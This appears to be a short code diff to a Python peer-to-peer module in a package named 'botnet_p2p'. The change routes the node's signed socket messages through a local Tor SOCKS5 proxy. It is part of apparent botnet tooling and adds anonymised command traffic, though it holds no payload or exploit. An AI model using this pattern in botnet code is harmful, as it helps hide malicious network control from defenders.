@@ -1,6 +1,7 @@
 """Socket wrapper with messages that are signed"""
 
 import socket
+import socks
 from typing import Tuple
 
 from botnet_p2p import (
@@ -17,6 +18,8 @@ from botnet_p2p.message import get_msg_data, get_msg_type, get_signed_hash
 
 address = Tuple[str, int]
 
+# Set the proxy we will use so the socket messages go through tor
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 
 class NodeP2P(object):
     """Socket wrapper to send and received signed messages"""
@@ -37,7 +40,7 @@ class NodeP2P(object):
         if already_created_socket:
             self.__socket = already_created_socket
         else:
-            self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.__socket = socks.socksocket()
 
         self.__public_key_path = public_key_path
         self.__private_key_path = private_key_path
